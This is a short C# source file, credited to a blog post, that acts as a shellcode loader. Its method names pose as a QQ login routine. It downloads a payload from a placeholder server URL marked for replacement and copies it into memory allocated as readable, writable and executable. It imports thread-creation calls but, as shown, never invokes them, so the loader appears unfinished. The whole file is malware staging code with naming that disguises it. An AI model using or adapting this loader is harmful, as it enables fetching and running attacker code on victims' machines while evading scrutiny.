// Original code made by Sugobet
// https://blog.csdn.net/qq_54704239/article/details/130215092

using System;
using System.Runtime.InteropServices;
using System.Net;

class Program
{
    // Importing VirtualAlloc from kernel32.dll to allocate memory in the process's address space
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    // Importing CreateThread from kernel32.dll to create a new thread in the current process
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    // Importing WaitForSingleObject from kernel32.dll to wait for a thread to finish execution
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
        // Entry point of the application, calling the LoginQQ method
        LoginQQ();
    }

    public static void LoginQQ()
    {
        // URL from which the payload will be downloaded
        string qq_loginURI = "http://server_addr:8000/hitme"; // REPLACE
        WebClient webClient = new WebClient();

        // Downloading the data from the specified URL
        byte[] qqLoginState = webClient.DownloadData(qq_loginURI);

        // Allocating memory in the process's address space with read/write/execute permissions
        UInt32 QQOpen = VirtualAlloc(0, (UInt32)qqLoginState.Length, 0x1000, 0x40);
        // Copying the downloaded data (payload) into the allocated memory
        Marshal.Copy(qqLoginState, 0, (IntPtr)(QQOpen), qqLoginState.Length);

    }
} 
